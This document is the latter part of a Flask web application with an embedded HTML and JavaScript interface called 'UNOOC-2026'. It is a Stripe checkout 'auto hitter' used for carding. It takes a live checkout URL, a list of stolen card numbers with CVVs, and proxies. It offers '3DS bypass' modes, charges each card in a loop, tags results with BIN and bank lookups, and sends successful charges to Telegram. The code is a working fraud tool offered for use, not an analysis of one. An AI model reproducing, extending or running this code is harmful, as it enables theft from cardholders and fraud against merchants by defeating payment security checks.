            border-radius: 16px; padding: 20px;
            border: 1px solid rgba(100, 120, 150, 0.2);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }
        .result-box:hover { border-color: rgba(100, 120, 150, 0.35); }
        .result-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; padding-bottom: 15px; border-bottom: 1px solid rgba(80, 100, 130, 0.3); }
        .result-title { font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 10px; }
        .result-title.approved { color: #81c784; }
        .result-title.declined { color: #e57373; }
        .count-badge { background: rgba(0,0,0,0.3); padding: 6px 14px; border-radius: 20px; font-size: 12px; border: 1px solid rgba(100, 120, 150, 0.2); }
        .cards-container { max-height: 400px; overflow-y: auto; padding-right: 5px; }
        .cards-container::-webkit-scrollbar { width: 6px; }
        .cards-container::-webkit-scrollbar-track { background: #15181f; border-radius: 3px; }
        .cards-container::-webkit-scrollbar-thumb { background: #3a4050; border-radius: 3px; }
        .card {
            background: rgba(18, 22, 30, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.25);
            border-radius: 12px; padding: 14px;
            margin-bottom: 10px; font-size: 12px; position: relative;
        }
        .card.approved { border-left: 3px solid #81c784; }
        .card.declined { border-left: 3px solid #e57373; }
        .card-cc { font-family: 'Courier New', monospace; font-weight: 600; margin-bottom: 6px; color: #a0b0c8; }
        .card-response { color: #8090a8; line-height: 1.5; word-break: break-word; }
        .full-response {
            background: rgba(15, 18, 25, 0.9);
            border: 1px solid rgba(100, 120, 150, 0.25);
            border-radius: 12px; padding: 14px;
            margin-top: 10px; font-family: monospace; font-size: 12px;
        }
        .response-line { color: #9098a8; padding: 3px 0; word-break: break-word; }
        .response-line.success { color: #4ade80; font-weight: bold; }
        .response-label { color: #8b6914; font-weight: bold; }
        .response-divider { color: #3d2015; padding: 5px 0; text-align: center; }
        .card-copy { position: absolute; top: 8px; right: 8px; background: none; border: none; color: #6b5245; cursor: pointer; padding: 4px 8px; font-size: 11px; border-radius: 4px; transition: all 0.2s; }
        .card-copy:hover { color: #a0b0c8; background: rgba(100,130,170,0.1); }
        .progress-bar { background: #15181f; border-radius: 10px; height: 8px; margin: 15px 0; overflow: hidden; display: none; }
        .progress-bar.show { display: block; }
        .progress-fill { height: 100%; background: linear-gradient(90deg, #4a5568, #6a7588); border-radius: 10px; transition: width 0.3s; width: 0%; }
        .status-text { text-align: center; color: #8090a8; font-size: 13px; margin-top: 10px; display: none; }
        .status-text.show { display: block; }
        .empty-state { text-align: center; color: #6b5245; padding: 40px 20px; font-size: 13px; }
        .checkout-info {
            background: rgba(18, 22, 30, 0.9);
            border: 1px solid rgba(80, 100, 130, 0.3);
            border-radius: 12px; padding: 15px;
            margin: 15px 0; font-size: 13px;
        }
        .checkout-info .info-row { display: flex; justify-content: space-between; padding: 5px 0; border-bottom: 1px solid rgba(80, 100, 130, 0.2); }
        .checkout-info .info-row:last-child { border-bottom: none; }
        .checkout-info .info-label { color: #6a7588; }
        .checkout-info .info-value { color: #a0b0c8; font-weight: 600; }
        .bin-info { margin: 8px 0; display: flex; flex-wrap: wrap; gap: 6px; align-items: center; }
        .bin-badge { background: #3a4050; color: #a0b0c8; padding: 3px 8px; border-radius: 4px; font-size: 10px; font-weight: 600; text-transform: uppercase; }
        .bin-bank { width: 100%; color: #7080a0; font-size: 11px; margin-top: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>UNOOC-2026</h1>
        <div id="autohitter-tab" class="tab-content active">
            <div class="input-section">
                <label>Stripe Checkout URL</label>
                <textarea id="checkoutUrl" placeholder="https://checkout.stripe.com/c/pay/cs_live_..." style="min-height:60px;"></textarea>
                <label style="margin-top:15px;">Proxies (optional - one per line)</label>
                <textarea id="proxyInput" placeholder="192.168.1.1:8080&#10;192.168.1.2:8080:username:password" style="min-height:60px;"></textarea>
                <label style="margin-top:15px;">3DS Bypass Mode</label>
                <select id="ahMode">
                    <option value="local">Local (3DS Bypass)</option>
                    <option value="hitbot">Xuron (3DS2 Bypass)</option>
                </select>
                <div class="btn-row" style="margin-top:15px;">
                    <button class="btn-primary" onclick="initCheckout()">Load Checkout</button>
                </div>
                <div class="checkout-info" id="checkoutInfo" style="display:none;">
                    <div class="info-row"><span class="info-label">Merchant</span><span class="info-value" id="infoMerchant">-</span></div>
                    <div class="info-row"><span class="info-label">Email</span><span class="info-value" id="infoEmail">-</span></div>
                    <div class="info-row"><span class="info-label">Price</span><span class="info-value" id="infoPrice">-</span></div>
                    <div class="info-row"><span class="info-label">PK</span><span class="info-value" id="infoPk">-</span></div>
                    <div class="info-row"><span class="info-label">CS</span><span class="info-value" id="infoCs">-</span></div>
                </div>
            </div>
            <div class="input-section" id="ahCardsSection" style="display:none;">
                <label>CC List (one per line)</label>
                <textarea id="ahCcInput" placeholder="4111111111111111|12|2025|123"></textarea>
                <div class="btn-row">
                    <button class="btn-primary" id="ahStartBtn" onclick="startAutoHit()">Start Auto Hit</button>
                    <button class="btn-danger" id="ahStopBtn" onclick="stopAutoHit()" style="display:none;">Stop</button>
                    <button class="btn-secondary" onclick="clearAhLogs()">Clear Logs</button>
                </div>
                <div class="progress-bar" id="ahProgressBar"><div class="progress-fill" id="ahProgressFill"></div></div>
                <div class="status-text" id="ahStatusText">Processing...</div>
            </div>
            <div class="results-grid" id="ahResultsGrid" style="display:none;">
                <div class="result-box">
                    <div class="result-header">
                        <span class="result-title approved">Charged</span>
                        <span class="count-badge" id="ahChargedCount">0</span>
                    </div>
                    <button class="btn-secondary" style="width:100%;margin-bottom:15px;padding:10px;" onclick="copyAllAh('charged')">Copy All Charged</button>
                    <div class="cards-container" id="ahChargedCards"><div class="empty-state">No charged cards yet</div></div>
                </div>
                <div class="result-box">
                    <div class="result-header">
                        <span class="result-title declined">Declined/3DS</span>
                        <span class="count-badge" id="ahDeclinedCount">0</span>
                    </div>
                    <button class="btn-secondary" style="width:100%;margin-bottom:15px;padding:10px;" onclick="copyAllAh('declined')">Copy All Declined</button>
                    <div class="cards-container" id="ahDeclinedCards"><div class="empty-state">No declined cards yet</div></div>
                </div>
            </div>
        </div>
    </div>
    <script>
        let ahCheckoutData = null;
        let ahRunning = false;
        let ahChargedList = [];
        let ahDeclinedList = [];
        let ahProxies = [];
        let ahTriedCards = [];

        async function initCheckout() {
            const url = document.getElementById('checkoutUrl').value.trim();
            if (!url) return alert('Please enter checkout URL');
            document.getElementById('checkoutInfo').style.display = 'none';
            document.getElementById('ahCardsSection').style.display = 'none';
            document.getElementById('ahResultsGrid').style.display = 'none';
            try {
                const response = await fetch('/autohitter/init', {
                    method: 'POST', headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({checkout_url: url})
                });
                const data = await response.json();
                if (data.error) { alert('Error: ' + data.error); return; }
                ahCheckoutData = data;
                ahCheckoutData.checkout_url = url;
                document.getElementById('infoMerchant').textContent = data.merchant || 'Unknown';
                document.getElementById('infoEmail').textContent = data.email || 'N/A';
                document.getElementById('infoPrice').textContent = data.price ? (data.currency + ' ' + data.price.toFixed(2)) : 'N/A';
                document.getElementById('infoPk').textContent = data.pk ? (data.pk.substring(0, 25) + '...') : 'N/A';
                document.getElementById('infoCs').textContent = data.cs ? (data.cs.substring(0, 25) + '...') : 'N/A';
                document.getElementById('checkoutInfo').style.display = 'block';
                document.getElementById('ahCardsSection').style.display = 'block';
                document.getElementById('ahResultsGrid').style.display = 'grid';
            } catch (e) { alert('Error loading checkout: ' + e.message); }
        }

        async function startAutoHit() {
            const input = document.getElementById('ahCcInput').value.trim();
            if (!input) return alert('Please enter CC list');
            if (!ahCheckoutData) return alert('Please load checkout first');
            const proxyInput = document.getElementById('proxyInput').value.trim();
            ahProxies = proxyInput ? proxyInput.split('\\n').map(p => p.trim()).filter(p => p) : [];
            ahTriedCards = [];
            const ccList = input.split('\\n').map(cc => cc.trim()).filter(cc => cc);
            if (ccList.length === 0) return;
            ahRunning = true;
            document.getElementById('ahStartBtn').style.display = 'none';
            document.getElementById('ahStopBtn').style.display = 'inline-block';
            document.getElementById('ahProgressBar').classList.add('show');
            document.getElementById('ahStatusText').classList.add('show');
            for (let i = 0; i < ccList.length; i++) {
                if (!ahRunning) break;
                const cc = ccList[i];
                ahTriedCards.push(cc);
                const progress = ((i + 1) / ccList.length) * 100;
                document.getElementById('ahProgressFill').style.width = progress + '%';
                document.getElementById('ahStatusText').textContent = 'Processing ' + (i + 1) + ' of ' + ccList.length + '...';
                try {
                    const mode = document.getElementById('ahMode').value;
                    const response = await fetch('/autohitter/charge', {
                        method: 'POST', headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({cc: cc, checkout_data: ahCheckoutData, proxies: ahProxies, tried_cards: ahTriedCards, mode: mode})
                    });
                    const data = await response.json();
                    addAhCard(data.card, data.response, data.status, data.time, data.bin_info);
                } catch (e) { addAhCard(cc, 'Error: Request failed', 'ERROR', 0, null); }
            }
            finishAutoHit();
        }

        function stopAutoHit() { ahRunning = false; finishAutoHit(); }
        function finishAutoHit() {
            ahRunning = false;
            document.getElementById('ahStartBtn').style.display = 'inline-block';
            document.getElementById('ahStopBtn').style.display = 'none';
            document.getElementById('ahStatusText').textContent = 'Completed!';
            setTimeout(() => {
                document.getElementById('ahProgressBar').classList.remove('show');
                document.getElementById('ahStatusText').classList.remove('show');
            }, 2000);
        }

        function addAhCard(cc, response, status, time, binInfo) {
            const isCharged = status === 'CHARGED';
            const container = document.getElementById(isCharged ? 'ahChargedCards' : 'ahDeclinedCards');
            const countEl = document.getElementById(isCharged ? 'ahChargedCount' : 'ahDeclinedCount');
            const list = isCharged ? ahChargedList : ahDeclinedList;
            if (container.querySelector('.empty-state')) container.innerHTML = '';
            list.push({cc, response, status});
            countEl.textContent = list.length;
            let binHtml = '';
            if (binInfo) {
                binHtml = '<div class="bin-info"><span class="bin-badge">' + binInfo.brand + '</span><span class="bin-badge">' + binInfo.type + '</span><span class="bin-badge">' + binInfo.country + ' ' + binInfo.country_flag + '</span><div class="bin-bank">' + binInfo.bank + '</div></div>';
            }
            let fullResponseHtml = '';
            if (isCharged && ahCheckoutData) {
                const merchant = ahCheckoutData.merchant || 'Unknown';
                const amount = (ahCheckoutData.currency || 'USD') + ' ' + (ahCheckoutData.price || '0');
                const email = ahCheckoutData.email || 'N/A';
                const checkoutUrl = ahCheckoutData.checkout_url || 'N/A';
                const binLine = binInfo ? (binInfo.brand + ' - ' + binInfo.type + ' - ' + (binInfo.level || 'N/A')) : 'N/A';
                const bankLine = binInfo ? binInfo.bank : 'N/A';
                const countryLine = binInfo ? (binInfo.country + ' ' + binInfo.country_flag) : 'N/A';
                fullResponseHtml = '<div class="full-response"><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line success" style="text-align:center;font-size:14px;">💠 𝐏𝐀𝐘𝐌𝐄𝐍𝐓 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 💠</div><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line"><span class="response-label">💳 𝐂𝐚𝐫𝐝  :</span> ' + escapeHtml(cc) + '</div><div class="response-line success"><span class="response-label">🔥 𝐒𝐭𝐚𝐭𝐮𝐬 :</span> Paid</div><div class="response-line"><span class="response-label">💰 𝐀𝐦𝐨𝐮𝐧𝐭 :</span> ' + escapeHtml(amount) + '</div><div class="response-line"><span class="response-label">🌐 𝐒𝐢𝐭𝐞   :</span> ' + escapeHtml(merchant) + '</div><div class="response-line"><span class="response-label">📩 𝐌𝐚𝐢𝐥  :</span> ' + escapeHtml(email) + '</div><br><div class="response-line"><span class="response-label">📦 𝐈𝐧𝐟𝐨  :</span> ' + escapeHtml(binLine) + '</div><div class="response-line"><span class="response-label">🏦 𝐁𝐚𝐧𝐤  :</span> ' + escapeHtml(bankLine) + '</div><div class="response-line"><span class="response-label">🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲:</span> ' + escapeHtml(countryLine) + '</div><br><div class="response-line"><span class="response-label">🔗 𝐂𝐨𝐧𝐟𝐢𝐫𝐦 :</span></div><div class="response-line"><a href="' + escapeHtml(checkoutUrl) + '" target="_blank" style="color:#8b6914;word-break:break-all;">' + escapeHtml(checkoutUrl) + '</a></div><br><div class="response-line" style="text-align:center;">🙏 Thank you!</div><div class="response-divider">━━━━━━━━━━━━━━━</div><div class="response-line"><span class="response-label">👤 𝐃𝐞𝐯 :</span> Zangi</div></div>';
            }
            const statusClass = isCharged ? 'approved' : 'declined';
            const card = document.createElement('div');
            card.className = 'card ' + statusClass;
            if (isCharged) {
                card.innerHTML = '<button class="card-copy" onclick="copyCard(this)">Copy</button><div class="card-cc">' + escapeHtml(cc) + '</div>' + binHtml + fullResponseHtml;
            } else {
                card.innerHTML = '<button class="card-copy" onclick="copyCard(this)">Copy</button><div class="card-cc">' + escapeHtml(cc) + '</div>' + binHtml + '<div class="card-response">[' + status + '] ' + escapeHtml(response) + ' (' + time + 's)</div>';
            }
            container.insertBefore(card, container.firstChild);
        }

        function copyAllAh(type) {
            const list = type === 'charged' ? ahChargedList : ahDeclinedList;
            if (list.length === 0) return alert('No cards to copy');
            const text = list.map(item => item.cc + ' | ' + item.status + ' | ' + item.response).join('\\n');
            navigator.clipboard.writeText(text);
            alert('Copied ' + list.length + ' cards!');
        }

        function clearAhLogs() {
            ahChargedList = []; ahDeclinedList = [];
            document.getElementById('ahChargedCards').innerHTML = '<div class="empty-state">No charged cards yet</div>';
            document.getElementById('ahDeclinedCards').innerHTML = '<div class="empty-state">No declined cards yet</div>';
            document.getElementById('ahChargedCount').textContent = '0';
            document.getElementById('ahDeclinedCount').textContent = '0';
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }

        function copyCard(btn) {
            const card = btn.parentElement;
            const cc = card.querySelector('.card-cc').textContent;
            const fullResp = card.querySelector('.full-response');
            const cardResp = card.querySelector('.card-response');
            let copyText = cc;
            if (fullResp) copyText = fullResp.innerText;
            else if (cardResp) copyText = cc + '\\n' + cardResp.textContent;
            navigator.clipboard.writeText(copyText);
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = 'Copy', 1500);
        }
    </script>
</body>
</html>
"""


@app.route('/')
def index():
    logger.debug("Serving index page")
    return render_template_string(HTML_TEMPLATE)


@app.route('/autohitter/init', methods=['POST'])
def autohitter_init():
    logger.info("Received checkout init request")
    data = request.get_json()
    checkout_url = data.get('checkout_url', '')

    if not checkout_url:
        logger.warning("Empty checkout URL received")
        return jsonify({"error": "No checkout URL provided"})

    extracted = extract_checkout_url(checkout_url) or checkout_url

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(get_checkout_info_async(extracted))
        if result.get("error"):
            logger.error(f"Checkout init failed: {result['error']}")
        else:
            logger.info(f"Checkout init success: {result.get('merchant', 'Unknown')}")
    except Exception as e:
        log_error("autohitter_init", e)
        result = {"error": str(e)}
    finally:
        loop.close()

    return jsonify(result)


@app.route('/autohitter/charge', methods=['POST'])
def autohitter_charge():
    data = request.get_json()
    cc = data.get('cc', '')
    checkout_data = data.get('checkout_data', {})
    proxies = data.get('proxies', [])
    tried_cards = data.get('tried_cards', [])

    logger.debug(f"Received charge request for card: {cc[:6]}******")

    card = parse_card_autohitter(cc)
    if not card:
        logger.warning(f"Invalid card format: {cc[:20]}...")
        return jsonify({'card': cc, 'status': 'INVALID', 'response': 'Invalid card format', 'time': 0})

    proxy = None
    if proxies:
        proxy = random.choice(proxies)
        logger.debug(f"Selected proxy: {proxy.split(':')[0]}:***")

    # Determine mode: 'local' or 'hitbot'
    mode = data.get('mode', 'local')
    logger.info(f"Charge mode: {mode} for {cc[:6]}******")

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        if mode == 'hitbot':
            # Use Hitbot API for 3DS bypass
            result = loop.run_until_complete(charge_card_with_hitbot(card, checkout_data, proxy))
        else:
            # Use local 3DS bypass
            result = loop.run_until_complete(charge_card_with_3ds(card, checkout_data, proxy))
    except Exception as e:
        log_error("autohitter_charge", e, f"Card: {card['cc'][:6]}******")
        result = {
            'card': cc,
            'status': 'ERROR',
            'response': f'Server error: {str(e)[:50]}',
            'time': 0
        }
    finally:
        loop.close()

    # Get BIN info
    bin_info = get_bin_info(cc)
    result['bin_info'] = bin_info

    # Send Telegram notification for charged cards
    if result['status'] == 'CHARGED':
        logger.info(f"Card charged successfully, sending Telegram notification: {cc[:6]}******{cc[-4:]}")
        price_str = f"{checkout_data.get('currency', 'USD')} {checkout_data.get('price', 0)}"
        email = checkout_data.get('email', 'N/A')
        checkout_url = checkout_data.get('checkout_url', 'N/A')
        send_telegram_autohitter(
            cc,
            result['response'],
            bin_info,
            checkout_data.get('merchant', 'Unknown'),
            price_str,
            email,
            checkout_url,
            tried_cards
        )

    logger.debug(f"Charge complete for {cc[:6]}****** | Status: {result['status']} | Time: {result['time']}s")

    return jsonify(result)


@app.errorhandler(404)
def not_found(error):
    logger.warning(f"404 error: {request.url}")
    return jsonify({'error': 'Not found'}), 404


@app.errorhandler(500)
def internal_error(error):
    logger.error(f"500 error: {str(error)}")
    return jsonify({'error': 'Internal server error'}), 500


if __name__ == '__main__':
    logger.info("Starting Flask server on 0.0.0.0:5000")
    try:
        app.run(host='0.0.0.0', port=5000, debug=False)
    except Exception as e:
        logger.critical(f"Failed to start server: {str(e)}")
        error_logger.critical(f"Server startup failure: {str(e)}\n{traceback.format_exc()}")
